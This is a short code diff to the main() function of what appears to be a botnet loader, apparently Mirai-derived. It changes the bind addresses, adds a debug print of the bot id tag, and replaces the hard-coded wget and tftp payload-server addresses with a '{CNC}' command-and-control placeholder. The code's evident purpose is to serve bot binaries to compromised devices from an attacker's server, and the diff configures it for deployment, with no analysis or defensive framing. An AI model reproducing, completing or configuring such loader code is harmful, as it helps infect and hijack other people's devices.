@@ -35,13 +35,14 @@ int main(int argc, char **args)
     addrs = calloc(addrs_len, sizeof (ipv4_t));
 
     addrs[0] = inet_addr("192.168.1.11"); // Address to bind to
-//    addrs[1] = inet_addr("192.168.1.1"); // Address to bind to
+    addrs[1] = inet_addr("192.168.1.1"); // Address to bind to
 #endif
 
     if (argc == 2)
     {
         id_tag = args[1];
     }
+    printf("[loader] id_tag=%s\n", id_tag);
 
     if (!binary_init())
     {
@@ -49,8 +50,8 @@ int main(int argc, char **args)
         return 1;
     }
 
-    /*                                                                                   wget address           tftp address */
-    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80, "192.168.1.11")) == NULL)
+    /*                                                                                   wget address  tftp address */
+    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "{CNC}", 80, "{CNC}")) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
